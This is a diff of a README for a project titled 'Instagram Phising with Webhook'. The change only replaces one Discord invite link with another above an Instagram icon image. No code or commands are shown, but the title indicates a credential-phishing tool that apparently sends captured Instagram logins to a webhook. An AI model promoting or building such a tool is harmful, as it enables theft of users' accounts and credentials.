@@ -1,4 +1,4 @@
-<a href="https://dsc.gg/kof/"><img width="120" height="120" align="left" style="float: left" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png"></a>
+<a href="https://dsc.gg/TEMauza/"><img width="120" height="120" align="left" style="float: left" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png"></a>
 # Instagram Phising with Webhook
 
 [![KoF](https://img.shields.io/discord/731725645851394118?color=5865F2&logo=discord&logoColor=white&style=for-the-badge)](https://dsc.gg/svcc/)
